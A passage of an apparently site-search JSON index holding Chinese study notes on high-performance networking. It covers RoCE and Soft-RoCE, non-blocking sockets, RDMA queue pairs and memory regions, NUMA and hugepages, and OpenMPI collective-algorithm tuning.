\u534f\u8bae\uff08\u4ea4\u6362\u673a\u9700\u8981\u652f\u6301 PFC \u7b49\u6d41\u63a7\u6280\u672f\uff0c\u5728\u7269\u7406\u5c42\u4fdd\u8bc1\u53ef\u9760\u4f20\u8f93\uff09\u3002</li> <li>RoCE v2\uff1a\u5c01\u88c5\u4e3a UDP\uff08\u7aef\u53e3 4791\uff09 + IPv4/IPv6\uff0c\u4ece\u800c\u5b9e\u73b0 L3 \u8def\u7531\u529f\u80fd\u3002\u53ef\u4ee5\u8de8 VLAN\u3001\u8fdb\u884c IP \u7ec4\u64ad\u4e86\u3002RoCEv2 \u53ef\u4ee5\u5de5\u4f5c\u5728 Lossless \u548c Lossy \u6a21\u5f0f\u4e0b\u3002<ul> <li>Lossless\uff1a\u9002\u7528\u4e8e\u6570\u636e\u4e2d\u5fc3\u7f51\u7edc\uff0c\u8981\u6c42\u4ea4\u6362\u673a\u652f\u6301 DCB\uff08Data Center Bridging\uff09\u6280\u672f\u3002</li> </ul> </li> </ul> <p>RoCE \u5305\u683c\u5f0f\uff1a</p>      RoCE \u5305\u683c\u5f0f      RoCE \u6307\u5357 - FS"},{"location":"optimization/HPN/#soft-roce","title":"Soft-RoCE","text":"<p>\u57fa\u4e8e Socket \u5b9e\u73b0\u7684 RoCE\u3002</p> <pre><code>modprobe rdma_rxe\nrdma link add rxe_0 type rxe netdev &lt;dev&gt;\n</code></pre>"},{"location":"optimization/HPN/#iwarp","title":"iWARP","text":""},{"location":"optimization/HPN/#soft-iwarp","title":"Soft-iWARP","text":"<p>\u5185\u6838\u6a21\u5757\u540d\u4e3a <code>siw</code>\uff0c\u540c\u4e0a\u3002</p> <p>\u5f85\u6574\u7406</p> <p>\u53c2\u8003\u8d44\u6599</p> <p>\u8fd9\u91cc\u662f\u4e00\u4e9b\u53c2\u8003\u8d44\u6599\uff0c\u5b83\u4eec\u76ee\u524d\u6ca1\u6709\u88ab\u672c\u7b14\u8bb0\u4f7f\u7528\uff0c\u5176\u4e2d\u7684\u5185\u5bb9\u6709\u5f85\u6316\u6398\u3002</p> <ul> <li>\u6653\u5175 - \u77e5\u4e4e\uff1a\u6709\u4e00\u4e9b\u6e90\u7801\u89e3\u6790\u548c\u524d\u6cbf\u6280\u672f\u7684\u8ba8\u8bba\u3002</li> </ul>"},{"location":"optimization/HPN/#\u4f20\u7edf\u7f51\u7edc\u6808\u7684\u4e0d\u8db3","title":"\u4f20\u7edf\u7f51\u7edc\u6808\u7684\u4e0d\u8db3","text":"<p>Quote</p> <ul> <li>ofi-guide/OFIGuide.md at master \u00b7 ofiwg/ofi-guide</li> </ul>"},{"location":"optimization/HPN/#non-blocking-socket","title":"Non-blocking Socket","text":"<p>Quote</p> <ul> <li> holmofy/echo-server</li> </ul> <p>\u5728\u8bfe\u5802\u4e0a\uff0c\u6211\u4eec\u5b66\u4e60\u8fc7 Socket \u7f16\u7a0b\u7684\u57fa\u672c\u65b9\u6cd5\u3002\u5728\u5b9e\u8df5\u4e2d\uff0c\u66f4\u591a\u5e94\u7528\u4f7f\u7528 non-blocking socket\uff1a</p> <pre><code>/* Example server code flow to initiate listen */\nstruct addrinfo *ai, hints;\nint listen_fd;\n\nmemset(&amp;hints, 0, sizeof hints);\nhints.ai_socktype = SOCK_STREAM;\nhints.ai_flags = AI_PASSIVE;\ngetaddrinfo(NULL, \"7471\", &amp;hints, &amp;ai);\n\nlisten_fd = socket(ai-&gt;ai_family, SOCK_STREAM, 0);\nbind(listen_fd, ai-&gt;ai_addr, ai-&gt;ai_addrlen);\nfreeaddrinfo(ai);\n\nfcntl(listen_fd, F_SETFL, O_NONBLOCK);\nlisten(listen_fd, 128);\n\n/* Example server code flow to accept a connection */\nstruct pollfd fds;\nint server_fd;\n\nfds.fd = listen_fd;\nfds.events = POLLIN;\n\npoll(&amp;fds, -1);\n\nserver_fd = accept(listen_fd, NULL, 0);\nfcntl(server_fd, F_SETFL, O_NONBLOCK);\n\n/* Example of server receiving data from client */\nstruct pollfd fds;\nsize_t offset, size, ret;\nchar buf[4096];\n\nfds.fd = server_fd;\nfds.events = POLLIN;\n\nsize = sizeof(buf);\nfor (offset = 0; offset &lt; size; ) {\n    poll(&amp;fds, -1);\n\n    ret = recv(client_fd, buf + offset, size - offset, 0);\n    offset += ret;\n}\n</code></pre> <p>\u5728\u9ad8\u5e76\u53d1\u573a\u666f\u4e0b\uff0cnon-blocking socket \u662f\u5fc5\u4e0d\u53ef\u5c11\u7684\uff1a</p> <ul> <li>\u5e76\u53d1\u548c\u54cd\u5e94\u6027\uff1a \u7b49\u5f85\u7f51\u7edc\u64cd\u4f5c\u65f6\u53ef\u4ee5\u5904\u7406\u5176\u4ed6\u4efb\u52a1\uff0c\u5355\u4e2a\u7ebf\u7a0b\u80fd\u591f\u5904\u7406\u591a\u4e2a\u8fde\u63a5\u3002</li> <li>\u8d44\u6e90\u5229\u7528\u7387\uff1a \u901a\u8fc7 <code>select</code> \u548c <code>poll</code> \u7b49 I/O \u591a\u8def\u590d\u7528\u6280\u672f\uff0c\u9ad8\u6548\u5904\u7406\u591a\u4e2a\u8fde\u63a5\u3002\u4e0e\u963b\u585e\u5f0f\u6a21\u578b\u4e3a\u6bcf\u4e2a\u8fde\u63a5\u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b\u76f8\u6bd4\uff0cnon-blocking socket \u51cf\u5c11\u4e86\u7ebf\u7a0b\u5f00\u9500\u3002</li> </ul>"},{"location":"optimization/HPN/#socket-\u7684\u4e0d\u8db3","title":"Socket \u7684\u4e0d\u8db3","text":"<p>\u5728\u5206\u6790\u4e0d\u8db3\u524d\uff0c\u9996\u5148\u80af\u5b9a Socket \u7684\u4e24\u5927\u4f18\u70b9\uff1a</p> <ul> <li>\u901a\u7528\u6027\uff1a \u9002\u7528\u4e8e\u5404\u79cd\u7f51\u7edc\u8bbe\u5907\u548c\u534f\u8bae\u3002</li> <li>\u6613\u7528\u6027\uff1a \u7f16\u7a0b\u7b80\u5355\uff0c\u8fd9\u662f\u975e\u5e38\u91cd\u8981\u7684\u4e00\u70b9\u3002\u63d0\u4f9b\u66f4\u9ad8\u6027\u80fd\u7684 API \u90fd\u6bd4 Socket \u66f4\u96be\u7f16\u7a0b\u3002\u7c7b\u6bd4 C/C++ \u4e0e\u6c47\u7f16\uff0c\u5bf9\u4e8e\u5927\u591a\u6570\u7a0b\u5e8f\u5458\u6765\u8bf4\uff0c\u7f16\u5199 C/C++ \u7a0b\u5e8f\u7684\u6027\u80fd\u66f4\u9ad8\u3002\u56e0\u6b64\u9009\u62e9 Socket \u4e4b\u5916\u7684 API \u65f6\uff0c\u9700\u8981\u6709\u660e\u786e\u7684\u9700\u6c42\u3002</li> </ul> <p>\u4f46 Socket \u65e0\u6cd5\u6ee1\u8db3\u9ad8\u6027\u80fd\u7f51\u7edc\u7684\u4e09\u70b9\u9700\u6c42\uff1a</p> <ul> <li> <p>\u907f\u514d\u5185\u5b58\u62f7\u8d1d\uff1a \u6211\u4eec\u5206\u522b\u8003\u8651\u53d1\u9001\u548c\u63a5\u6536\u7aef\u7684\u5904\u7406\u8fc7\u7a0b</p> <ul> <li>\u53d1\u9001\u7aef\uff1a <code>send()</code> \u8fd4\u56de\u65f6\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u91cd\u7528\u7f13\u51b2\u533a\u3002\u7136\u800c\u53ea\u6709\u5bf9\u65b9 ACK\uff0c\u624d\u80fd\u786e\u4fdd\u6570\u636e\u6210\u529f\u9001\u8fbe\u3002\u7f51\u7edc\u6808\u6709\u4e24\u79cd\u9009\u62e9\uff1a\u963b\u585e\uff0c\u7b49\u5f85 ACK \u8fd4\u56de\uff1b\u7acb\u5373\u8fd4\u56de\uff0c\u4f46\u9700\u8981\u5c06\u6570\u636e\u62f7\u8d1d\u5230\u5185\u6838\u7f13\u51b2\u533a\uff0c\u7b49\u5f85 ACK \u91ca\u653e\u3002</li> <li>\u63a5\u6536\u7aef\uff1a \u7f51\u7edc\u9002\u914d\u5668\u6536\u5230\u6570\u636e\u5305\u540e\u653e\u5165\u5185\u6838\u7f13\u51b2\u533a\uff0c\u5426\u5219\u4e22\u5f03\u3002\u8981\u907f\u514d\u62f7\u8d1d\uff0c\u552f\u4e00\u7684\u65b9\u6cd5\u5c31\u662f\u5728 <code>send()</code> \u524d\u8c03\u7528 <code>recv()</code>\uff0c\u7136\u800c\u8fd9\u4f1a\u963b\u585e\u63a5\u6536\u7aef\uff0c\u4e14\u5728\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\u65e0\u6cd5\u6ee1\u8db3\u3002</li> </ul> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u64cd\u4f5c\u7cfb\u7edf\u7f51\u7edc\u6808\u4e0d\u5f97\u4e0d\u7ef4\u62a4\u7f13\u51b2\u533a\uff0c\u9020\u6210\u6570\u636e\u5728\u5e94\u7528\u7a0b\u5e8f\u548c\u7f51\u7edc\u6808\u4e4b\u95f4\u7684\u62f7\u8d1d\u3002</p> <p>\u5982\u679c\u80fd\u591f\u652f\u6301\u5c06\u6570\u636e\u76f4\u63a5\u5199\u5165\u7279\u5b9a\u7684\u5185\u5b58\u533a\u57df\uff0c\u5c06\u663e\u8457\u63d0\u5347\u67d0\u4e9b\u5e94\u7528\u7684\u6027\u80fd\u3002\u4f8b\u5982\uff1a\u6570\u636e\u5e93\u53ef\u80fd\u5e0c\u671b\u5c06\u6536\u5230\u7684\u8bb0\u5f55\u5408\u5e76\u5230\u8868\u4e2d\u3002</p> </li> <li> <p>\u5f02\u6b65\u64cd\u4f5c\uff1a Socket API \u4ee5\u540c\u6b65\u65b9\u5f0f\u8fd0\u884c\u3002\u8981\u4f7f\u7528 Socket \u8fdb\u884c\u5f02\u6b65\u64cd\u4f5c\uff0c\u5c31\u4f1a\u4ea7\u751f\u989d\u5916\u7684\u62f7\u8d1d\u3002</p> </li> <li> <p>\u76f4\u63a5\u8bbf\u95ee\u786c\u4ef6\uff1a</p> </li> </ul> <p>\u5f85\u6574\u7406</p>"},{"location":"optimization/HPN/#rdma-\u57fa\u672c\u6982\u5ff5","title":"RDMA \u57fa\u672c\u6982\u5ff5","text":"<p>Quote</p>"},{"location":"optimization/HPN/#\u6ce8\u518c\u5185\u5b58\u533a\u57df","title":"\u6ce8\u518c\u5185\u5b58\u533a\u57df","text":"<p>RDMA \u901a\u4fe1\u524d\uff0c\u9700\u8981\u5148\u6ce8\u518c\u5185\u5b58\u533a\u57df MR\uff08memory region\uff09\uff0c\u4f9b RDMA \u8bbe\u5907\u8bbf\u95ee\uff1a</p> <ul> <li>\u5185\u5b58\u9875\u9762\u5fc5\u987b\u88ab Pin \u4f4f\u4e0d\u53ef\u6362\u51fa\u3002</li> <li>\u6ce8\u518c\u65f6\u83b7\u5f97 L_Key\uff08local key\uff09 \u548c R_Key\uff08remote key\uff09\u3002\u524d\u8005\u7528\u4e8e\u672c\u5730\u8bbf\u95ee\uff0c\u540e\u8005\u7528\u4e8e\u8fdc\u7a0b\u8bbf\u95ee\u3002</li> </ul>"},{"location":"optimization/HPN/#\u4ea4\u6362\u4fe1\u606f","title":"\u4ea4\u6362\u4fe1\u606f","text":"<p>\u5728\u8fdb\u884c RDMA \u901a\u4fe1\u524d\uff0c\u901a\u4fe1\u53cc\u65b9\u9700\u8981\u4ea4\u6362 R_Key \u548c QP \u7b49\u4fe1\u606f\u3002\u53ef\u4ee5\u5148\u901a\u8fc7\u4ee5\u592a\u7f51\u5efa\u7acb TCP \u8fde\u63a5\uff0c\u6216\u8005\u4f7f\u7528 <code>rdma_cm</code> \u7ba1\u7406 RDMA \u8fde\u63a5\u3002</p>"},{"location":"optimization/HPN/#\u5f02\u6b65\u901a\u4fe1","title":"\u5f02\u6b65\u901a\u4fe1","text":"<p>RDMA \u57fa\u4e8e\u4e09\u4e2a\u961f\u5217\u8fdb\u884c\u5f02\u6b65\u901a\u4fe1\uff1a</p> <ul> <li>Send\u3001Receive \u961f\u5217\u7528\u4e8e\u8c03\u5ea6\u5de5\u4f5c\uff08work\uff09\u3002\u8fd9\u4e24\u4e2a\u961f\u5217\u4e5f\u5408\u79f0\u4e3a Queue Pair\uff08QP\uff09\u3002</li> <li>Completion \u961f\u5217\u7528\u4e8e\u901a\u77e5\u5de5\u4f5c\u5b8c\u6210\u3002</li> </ul> <p>RDMA \u901a\u4fe1\u6d41\u7a0b\u5982\u4e0b\uff1a</p> <ul> <li>\u5e94\u7528\u7a0b\u5e8f\u5c06 WR\uff08work request\uff0c\u4e5f\u79f0\u4e3a work queue element\uff09\u653e\u5165\uff08post\uff09\u5230 Send \u6216 Receive \u961f\u5217\u3002</li> <li>WR \u4e2d\u542b\u6709 SGE\uff08Scatter/Gather Elements\uff09\uff0c\u6307\u5411 RDMA \u8bbe\u5907\u53ef\u4ee5\u8bbf\u95ee\u7684\u4e00\u5757 MR \u533a\u57df\u3002\u5728 Send \u961f\u5217\u4e2d\u6307\u5411\u53d1\u9001\u6570\u636e\uff0cReceive \u961f\u5217\u4e2d\u6307\u5411\u63a5\u6536\u6570\u636e\u3002</li> <li>WR \u5b8c\u6210\u540e\uff0cRDMA \u8bbe\u5907\u521b\u5efa WC\uff08work completion\uff0c\u4e5f\u79f0\u4e3a completion queue element\uff09\u653e\u5165 Completion \u961f\u5217\u3002\u5e94\u7528\u5411\u9002\u914d\u5668\u8f6e\u8be2\uff08poll\uff09Completion \u961f\u5217\uff0c\u83b7\u53d6 WC\u3002</li> </ul> <p>\u5bf9\u4e8e\u4e00\u4e2a\u5e94\u7528\uff0cQP \u548c CQ \u53ef\u4ee5\u662f\u591a\u5bf9\u4e00\u7684\u5173\u7cfb\u3002QP\u3001CQ \u548c MR \u90fd\u5b9a\u4e49\u5728\u4e00\u4e2a Protection Domain\uff08PD\uff09 \u4e2d\u3002</p>      RDMA \u901a\u4fe1\u961f\u5217      InfiniBand Technology Overview - SNIA"},{"location":"optimization/HPN/#\u8bbf\u5b58\u6a21\u5f0f","title":"\u8bbf\u5b58\u6a21\u5f0f","text":"<p>RDMA \u652f\u6301\u4e24\u79cd\u8bbf\u5b58\u6a21\u5f0f\uff1a</p> <ul> <li>\u5355\u8fb9\uff08one-sided\uff09\uff1aread\u3001write\u3001atomic \u64cd\u4f5c\u3002<ul> <li>\u88ab\u52a8\u65b9\u6ce8\u518c\u4e00\u5757\u5185\u5b58\u533a\u57df\uff0c\u7136\u540e\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9\u4e3b\u52a8\u65b9\uff1b\u4e3b\u52a8\u65b9\u4f7f\u7528 RDMA Read/Write \u64cd\u4f5c\u8fd9\u5757\u5185\u5b58\u533a\u57df\u3002</li> <li>\u88ab\u52a8\u65b9\u4e0d\u4f1a\u4f7f\u7528 CPU \u8d44\u6e90\uff0c\u4e0d\u4f1a\u77e5\u9053 read\u3001write \u64cd\u4f5c\u7684\u53d1\u751f\u3002</li> <li>WR \u5fc5\u987b\u5305\u542b\u8fdc\u7aef\u7684\u865a\u62df\u5185\u5b58\u5730\u5740\u548c R_key\uff0c\u4e3b\u52a8\u65b9\u5fc5\u987b\u63d0\u524d\u77e5\u9053\u8fd9\u4e9b\u4fe1\u606f\u3002</li> </ul> </li> <li>\u53cc\u8fb9\uff08two-sided\uff09\uff1asend\u3001receive \u64cd\u4f5c\u3002<ul> <li>\u6e90\u548c\u76ee\u7684\u5e94\u7528\u90fd\u9700\u8981\u4e3b\u52a8\u53c2\u4e0e\u901a\u4fe1\u3002\u53cc\u65b9\u90fd\u9700\u8981\u521b\u5efa QP \u548c CQ\u3002</li> <li>\u4e00\u65b9\u53d1\u9001 receive\uff0c\u5219\u5bf9\u7aef\u9700\u8981\u53d1\u9001 send\uff0c\u6765\u6d88\u8017\uff08consume\uff09\u8fd9\u4e2a receive\u3002</li> <li>\u63a5\u6536\u65b9\u9700\u8981\u5148\u53d1\u9001\u81ea\u5df1\u63a5\u6536\u7684\u6570\u636e\u7ed3\u6784\uff0c\u7136\u540e\u53d1\u9001\u7aef\u6309\u7167\u8fd9\u4e2a\u6570\u636e\u7ed3\u6784\u53d1\u9001\u6570\u636e\u3002\u8fd9\u610f\u5473\u7740\u63a5\u6536\u65b9\u7684\u7f13\u51b2\u533a\u548c\u6570\u636e\u7ed3\u6784\u5bf9\u53d1\u9001\u65b9\u4e0d\u53ef\u89c1\u3002</li> </ul> </li> </ul> <p>\u5728\u5355\u4e2a\u8fde\u63a5\u4e2d\uff0c\u53ef\u4ee5\u6df7\u7528\u5e76\u5339\u914d\uff08mix and match\uff09\u8fd9\u4e24\u79cd\u6a21\u5f0f\u3002</p>"},{"location":"optimization/HPN/#\u5185\u6838\u65c1\u8def","title":"\u5185\u6838\u65c1\u8def","text":"<p>RDMA \u63d0\u4f9b\u5185\u6838\u65c1\u8def\uff08kernel bypass\uff09\u529f\u80fd\uff1a</p> <ul> <li>\u539f\u5148\u7531 CPU \u8d1f\u8d23\u7684\u5206\u7247\u3001\u53ef\u9760\u6027\u3001\u91cd\u4f20\u7b49\u529f\u80fd\uff0c\u73b0\u5728\u7531\u9002\u914d\u5668\u8d1f\u8d23\u3002</li> <li>RDMA \u786c\u4ef6\u548c\u9a71\u52a8\u5177\u6709\u7279\u6b8a\u7684\u8bbe\u8ba1\uff0c\u53ef\u4ee5\u5b89\u5168\u5730\u5c06\u786c\u4ef6\u6620\u5c04\u5230\u7528\u6237\u7a7a\u95f4\uff0c\u8ba9\u5e94\u7528\u7a0b\u5e8f\u76f4\u63a5\u8bbf\u95ee\u786c\u4ef6\u8d44\u6e90\u3002</li> <li>\u6570\u636e\u901a\u8def\u76f4\u63a5\u4ece\u7528\u6237\u7a7a\u95f4\u5230\u786c\u4ef6\uff0c\u4f46\u63a7\u5236\u901a\u8def\u4ecd\u7136\u901a\u8fc7\u5185\u6838\uff0c\u5305\u62ec\u8d44\u6e90\u7ba1\u7406\u3001\u72b6\u6001\u76d1\u63a7\u548c\u6e05\u7406\u7b49\u3002\u4fdd\u8bc1\u7cfb\u7edf\u5b89\u5168\u7a33\u5b9a\u3002</li> </ul> <p>Question</p> <p>\u4e8b\u5b9e\u4e0a\uff0c\u901a\u4fe1\u53cc\u65b9\u7684 QP \u88ab\u76f4\u63a5\u6620\u5c04\u5230\u4e86\u7528\u6237\u7a7a\u95f4\uff0c\u56e0\u6b64\u76f8\u5f53\u4e8e\u76f4\u63a5\u8bbf\u95ee\u5bf9\u65b9\u7684\u5185\u5b58\u3002</p> <p>\u5982\u679c\u4f60\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u548c\u786c\u4ef6\u9a71\u52a8\u6709\u4e00\u4e9b\u4e86\u89e3\uff0c\u4e0d\u59a8\u60f3\u4e00\u60f3\u4e0b\u9762\u7684\u95ee\u9898\uff1a</p> <ul> <li>\u5982\u4f55\u624d\u80fd\u8ba9\u5e94\u7528\u7a0b\u5e8f\u76f4\u63a5\u8bbf\u95ee\u786c\u4ef6\u8d44\u6e90\uff0c\u540c\u65f6\u5b9e\u73b0\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u7684\u5e94\u7528\u9694\u79bb\u548c\u4fdd\u62a4\u5462\uff1f</li> <li>\u5982\u679c\u5728\u4e24\u4e2a\u72ec\u7acb\u7684\u865a\u62df\u5185\u5b58\u7a7a\u95f4\uff08\u53ef\u80fd\u5728\u4e0d\u540c\u7269\u7406\u673a\u3001\u4e0d\u540c\u67b6\u6784\u4e0a\uff09\u4e4b\u95f4\u5efa\u7acb\u8054\u7cfb\uff1f</li> </ul>"},{"location":"optimization/HPN/#\u5b9e\u7528\u5de5\u5177_1","title":"\u5b9e\u7528\u5de5\u5177","text":"<pre><code>show_gids\n</code></pre>"},{"location":"optimization/HPN/#perftest","title":"perftest","text":"<p>\u9700\u8981\u719f\u7ec3\u638c\u63e1\u4f7f\u7528 perftest \u5957\u4ef6\u6d4b\u8bd5\u5404\u7c7b\u6307\u6807\u3002\u4ee5\u6700\u5e38\u7528\u7684 <code>ib_send_bw</code> \u4e3a\u4f8b\uff1a</p> <pre><code>ib_send_bw\n</code></pre>"},{"location":"optimization/HPN/#\u901a\u4fe1\u6846\u67b6","title":"\u901a\u4fe1\u6846\u67b6","text":""},{"location":"optimization/HPN/#nccl","title":"NCCL","text":""},{"location":"optimization/HPN/#hccl","title":"HCCL","text":""},{"location":"optimization/HPN/#tccl","title":"TCCL","text":""},{"location":"optimization/HPN/#\u6587\u732e\u9605\u8bfb","title":"\u6587\u732e\u9605\u8bfb","text":""},{"location":"optimization/HPN/#eurosys20-strom-smart-remote-memory","title":"EuroSys\u201920 StRoM: Smart Remote Memory","text":"<p>\u57fa\u4e8e FPGA \u7684 SmartNIC\u3002\u6269\u5c55 IB Verbs\uff0c\u5c06 RPC \u64cd\u4f5c Offload \u5230\u8fdc\u7aef SmartNIC \u4e0a\u6267\u884c\u3002\u597d\u5904\u662f\u80fd\u591f\u5c06\u591a\u6b21 RTT \u7684\u64cd\u4f5c\u5408\u5e76\u4e3a\u4e00\u6b21 RTT\uff0c\u5230\u9760\u8fd1\u6570\u636e\u7684\u5730\u65b9\u6267\u884c\u3002</p> <p>\u7cfb\u7edf\u7531\u4e09\u4e2a\u90e8\u5206\u6784\u6210\uff1a</p> <ul> <li>RoCE \u7f51\u7edc\u6808</li> <li>StRoM \u53ef\u7f16\u7a0b Kernel</li> <li>DMA \u5f15\u64ce</li> </ul> <p>\u8bba\u6587\u4e2d\u7684\u5178\u578b\u5e94\u7528\u573a\u666f\uff1a</p> <ul> <li>KV \u5b58\u50a8\uff1a\u5728 NIC \u4e0a\u901a\u8fc7 DMA \u8bfb\u54c8\u5e0c\u8868\u548c\u83b7\u53d6\u6570\u636e\u3002</li> </ul> <p>\u4e00\u4e9b\u77e5\u8bc6\u70b9\uff1a</p> <ul> <li>RDMA \u64cd\u4f5c\u4f7f\u7528\u865a\u62df\u5185\u5b58\u5730\u5740\uff0c\u4f46\u662f PCIe \u8bbf\u95ee\u4e3b\u5b58\u4f7f\u7528\u7269\u7406\u5185\u5b58\u5730\u5740\u3002\u56e0\u6b64 SmartNIC \u4e0a\u9700\u8981\u4e00\u4e2a TLB\u3002</li> </ul> <p>Resources on BlueField 2 Smart NICs: https://gist.github.com/aagontuk/cf01763c8ee26383afe10f51c9cd2984</p> <ul> <li>\u4ea4\u6362\u82af\u7247 BlueField\uff1a\u7528\u4e8e DPU \u4ea7\u54c1\u7ebf\uff0c\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u7f51\u5361\u4e0a\u6709\u72ec\u7acb\u7684 CPU\uff0c\u53ef\u4ee5\u5904\u7406\u7f51\u7edc\u6d41\u91cf\u3002\u4f8b\u5982\uff0c\u4e0b\u9762\u662f BlueField-2 DPU \u7684\u67b6\u6784\u56fe\uff1a</li> </ul>      BlueField-2 DPU \u67b6\u6784      Nvidia Bluefield DPU Architecture - DELL"},{"location":"optimization/HPN/#\u95ee\u9898\u8bb0\u5f55","title":"\u95ee\u9898\u8bb0\u5f55","text":""},{"location":"optimization/HPN/#\u7f16\u8bd1\u76f8\u5173","title":"\u7f16\u8bd1\u76f8\u5173","text":"<ul> <li> <p>\u7f16\u8bd1 DPDK \u65f6</p> <pre><code>Generating drivers/rte_common_ionic.pmd.c with a custom command\nFAILED: drivers/rte_common_ionic.pmd.c\n...\nException: elftools module not found\n</code></pre> <p>\u89e3\u51b3\u65b9\u6cd5\uff1a<code>pip</code> \u5b89\u88c5 <code>pyelftools</code> \u6a21\u5757</p> </li> </ul>"},{"location":"optimization/HPN/#\u5176\u4ed6\u76f8\u5173\u77e5\u8bc6","title":"\u5176\u4ed6\u76f8\u5173\u77e5\u8bc6","text":"<ul> <li>DMA \u673a\u5236\uff1a\u5305\u62ec IOVA\u3001VFIO \u7b49\u3002</li> <li>Linux \u5185\u5b58\u7ba1\u7406\u673a\u5236\uff1a\u5305\u62ec Hugepage\u3001NUMA \u7b49\u3002</li> <li>Linux \u8d44\u6e90\u5206\u914d\u673a\u5236\uff1a\u5305\u62ec cgroup \u7b49\u3002</li> <li> <p>\u57fa\u7840\u7ebf\u7a0b\u5e93 pthread\u3002</p> </li> <li> <p>Non-Uniform Memory Access (NUMA)\uff1a\u975e\u4e00\u81f4\u6027\u5185\u5b58\u8bbf\u95ee\u3002</p> <ul> <li>\u4e0e UMA \u76f8\u6bd4\u7684\u4f18\u52a3\uff1a\u5185\u5b58\u5e26\u5bbd\u589e\u5927\uff0c\u9700\u8981\u7f16\u7a0b\u8005\u8003\u8651\u5c40\u90e8\u6027</li> <li>\u6bcf\u5757\u5185\u5b58\u6709<ul> <li>home\uff1a\u7269\u7406\u4e0a\u6301\u6709\u8be5\u5730\u5740\u7a7a\u95f4\u7684\u5904\u7406\u5668</li> <li>owner\uff1a\u6301\u6709\u8be5\u5757\u5185\u5b58\u503c\uff08\u5199\u4e86\u8be5\u5757\u5185\u5b58\uff09\u7684\u5904\u7406\u5668</li> </ul> </li> <li>Linux NUMA\uff1ahttps://docs.kernel.org/mm/numa.html<ul> <li>Cache Coherent NUMA</li> <li>\u786c\u4ef6\u8d44\u6e90\u5212\u5206\u4e3a node<ul> <li>\u9690\u85cf\u4e86\u4e00\u4e9b\u7ec6\u8282\uff0c\u4e0d\u80fd\u9884\u671f\u540c\u4e2a node \u4e0a\u7684\u8bbf\u5b58\u6548\u7387\u76f8\u540c</li> <li>\u6bcf\u4e2a node \u6709\u81ea\u5df1\u7684\u5185\u5b58\u7ba1\u7406\u7cfb\u7edf</li> <li>Linux \u4f1a\u5c3d\u53ef\u80fd\u4e3a\u4efb\u52a1\u5206\u914d node-local \u5185\u5b58</li> <li>\u5728\u8db3\u591f\u4e0d\u5e73\u8861\u7684\u6761\u4ef6\u4e0b\uff0cscheduler \u4f1a\u5c06\u4efb\u52a1\u8fc1\u79fb\u5230\u5176\u4ed6 node\uff0c\u9020\u6210\u8bbf\u5b58\u6548\u7387\u4e0b\u964d</li> </ul> </li> <li>Memory Policy</li> </ul> </li> <li>Linux \u5b9e\u8df5<ul> <li><code>numactl</code></li> <li><code>lstopo</code></li> </ul> </li> </ul> </li> <li> <p>Hugepage</p> <ul> <li>\u53d7\u9650\u4e8e TLB \u5927\u5c0f\uff0cHugepage \u4f1a\u51cf\u5c11 TLB miss</li> <li>\u573a\u666f\uff1a\u968f\u673a\u8bbf\u5b58\u3001\u5927\u578b\u6570\u636e\u7ed3\u6784</li> <li>https://www.evanjones.ca/hugepages-are-a-good-idea.html</li> <li>https://rigtorp.se/hugepages/</li> </ul> </li> </ul>"},{"location":"optimization/HPN/algorithm/","title":"\u901a\u4fe1\u7b97\u6cd5","text":""},{"location":"optimization/HPN/algorithm/#\u901a\u4fe1\u7b97\u6cd5","title":"\u901a\u4fe1\u7b97\u6cd5","text":"<p>MPI \u5b9e\u73b0\u4e00\u822c\u90fd\u4f1a\u4e3a\u96c6\u5408\u901a\u4fe1\u63d0\u4f9b\u4e0d\u540c\u7684\u7b97\u6cd5\uff0c\u4ee5\u9002\u5e94\u4e0d\u540c\u7684\u901a\u4fe1\u6a21\u5f0f\u3002\u8fd9\u4e9b\u7b97\u6cd5\u5728\u7279\u5b9a\u573a\u666f\u4e0b\u53ef\u80fd\u4f1a\u6709\u4e0d\u540c\u7684\u6027\u80fd\u8868\u73b0\uff0c\u56e0\u6b64\u9700\u8981\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8fdb\u884c\u8c03\u4f18\u3002</p> <p>\u4e00\u7bc7\u7ecf\u5178\u7684\u4f8b\u5b50\u662f\uff1aGitHub: OpenMPI Bcast and Allreduce much slower than Intel-MPI (unrelated to EFA)\u3002\u8fd9\u4f4d\u4f5c\u8005\u5728 AWS \u96c6\u7fa4\u4e0a\u6d4b\u8bd5\u4e86 OpenMPI \u548c IntelMPI \u5404\u79cd\u7b97\u6cd5\u7684\u6027\u80fd\uff0c\u7ed9\u51fa\u4e86\u8be6\u7ec6\u7684\u6d4b\u8bd5\u7ed3\u679c\u3002</p> <p></p> <p>\u53ef\u4ee5\u770b\u51fa\u6027\u80fd\u5dee\u8ddd\u8fd8\u662f\u6bd4\u8f83\u660e\u663e\u7684\uff0c\u56e0\u6b64\u7b97\u6cd5\u8c03\u4f18\u662f\u975e\u5e38\u91cd\u8981\u7684\u3002</p> OpenMPIIntel MPI <ul> <li>\u5217\u51fa\u53ef\u7528\u7684\u96c6\u5408\u901a\u4fe1\u7b97\u6cd5\uff1a</li> </ul> <pre><code>ompi_info --param coll tuned --level 9\nMCA coll tuned: parameter \"coll_tuned_allreduce_algorithm\" (current\n                          value: \"ignore\", data source: default, level: 5\n                          tuner/detail, type: int)\n                          Which allreduce algorithm is used. Can be locked\n                          down to any of: 0 ignore, 1 basic linear, 2\n                          nonoverlapping (tuned reduce + tuned bcast), 3\n                          recursive doubling, 4 ring, 5 segmented ring. Only\n                          relevant if coll_tuned_use_dynamic_rules is true.\n                          Valid values: 0:\"ignore\", 1:\"basic_linear\",\n                          2:\"nonoverlapping\", 3:\"recursive_doubling\",\n                          4:\"ring\", 5:\"segmented_ring\", 6:\"rabenseifner\"\n</code></pre> <ul> <li>\u901a\u8fc7 MCA \u53c2\u6570\u8bbe\u7f6e\u7b97\u6cd5\uff0c\u4ee5 recursive doubling \u4e3a\u4f8b\uff1a</li> </ul> <pre><code>--mca coll_tuned_use_dynamic_rules 1 \\\n--mca coll_tuned_allreduce_algorithm 3 \\\n--mca coll_tuned_allreduce_algorithm_segmentsize 4096 \\\n--mca coll_tuned_allreduce_algorithm_tree_fanout 4\n</code></pre> <ul> <li>\u8bbe\u7f6e Bcast \u7b97\u6cd5\uff1a</li> </ul> <pre><code>orterun \\\n--mca 